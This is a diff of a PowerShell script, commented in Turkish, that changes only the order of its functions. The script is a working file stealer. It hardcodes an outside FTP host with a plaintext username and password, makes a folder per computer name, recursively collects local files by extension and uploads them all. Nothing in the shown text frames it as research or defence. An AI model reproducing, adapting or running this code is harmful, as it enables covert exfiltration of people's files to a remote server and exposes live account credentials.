@@ -2,13 +2,49 @@
 $ftpServer = "ftp://ftpupload.net/htdocs"
 $ftpUser = "if0_37085342"
 $ftpPassword = "VoUET8ZqlB0Crb"
-$ftpPort = 21
 
 # Bilgisayar adını al
 $computerName = $env:COMPUTERNAME
 
 # FTP klasörü oluşturma URL'si
 $ftpFolder = "$ftpServer/$computerName"
+
+# FTP'ye dosya yükleme fonksiyonu
+function Upload-FileToFtp {
+    param (
+        [string]$filePath,
+        [string]$ftpUrl,
+        [string]$ftpUser,
+        [string]$ftpPassword
+    )
+
+    if (Test-Path $filePath) {
+        $fileName = [System.IO.Path]::GetFileName($filePath)
+        $ftpFullUrl = "$ftpUrl/$fileName"
+        
+        try {
+            $ftpRequest = [System.Net.FtpWebRequest]::Create($ftpFullUrl)
+            $ftpRequest.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
+            $ftpRequest.Credentials = New-Object System.Net.NetworkCredential($ftpUser, $ftpPassword)
+            $ftpRequest.UseBinary = $true
+
+            $fileContent = [System.IO.File]::ReadAllBytes($filePath)
+            $ftpRequest.ContentLength = $fileContent.Length
+
+            $requestStream = $ftpRequest.GetRequestStream()
+            $requestStream.Write($fileContent, 0, $fileContent.Length)
+            $requestStream.Close()
+
+            $response = $ftpRequest.GetResponse()
+            Write-Output "Başarıyla yüklendi: $filePath"
+            $response.Close()
+        } catch {
+            Write-Output "Hata: $($_.Exception.Message)"
+        }
+    } else {
+        Write-Output "Dosya bulunamadı: $filePath"
+    }
+}
 
 # FTP sunucusunda klasör oluşturma
 function Create-FtpDirectory {
@@ -70,42 +106,5 @@ foreach ($searchPath in $searchPaths) {
         Get-ChildItem -Path $searchPath -Recurse -Filter $ext -ErrorAction SilentlyContinue | ForEach-Object {
             Upload-FileToFtp -filePath $_.FullName -ftpUrl $ftpFolder -ftpUser $ftpUser -ftpPassword $ftpPassword
         }
-    }
-}
-
-# FTP'ye dosya yükleme fonksiyonu
-function Upload-FileToFtp {
-    param (
-        [string]$filePath,
-        [string]$ftpUrl,
-        [string]$ftpUser,
-        [string]$ftpPassword
-    )
-
-    if (Test-Path $filePath) {
-        $fileName = [System.IO.Path]::GetFileName($filePath)
-        $ftpFullUrl = "$ftpUrl/$fileName"
-        
-        try {
-            $ftpRequest = [System.Net.FtpWebRequest]::Create($ftpFullUrl)
-            $ftpRequest.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
-            $ftpRequest.Credentials = New-Object System.Net.NetworkCredential($ftpUser, $ftpPassword)
-            $ftpRequest.UseBinary = $true
-
-            $fileContent = [System.IO.File]::ReadAllBytes($filePath)
-            $ftpRequest.ContentLength = $fileContent.Length
-
-            $requestStream = $ftpRequest.GetRequestStream()
-            $requestStream.Write($fileContent, 0, $fileContent.Length)
-            $requestStream.Close()
-
-            $response = $ftpRequest.GetResponse()
-            Write-Output "Başarıyla yüklendi: $filePath"
-            $response.Close()
-        } catch {
-            Write-Output "Hata: $($_.Exception.Message)"
-        }
-    } else {
-        Write-Output "Dosya bulunamadı: $filePath"
     }
 }
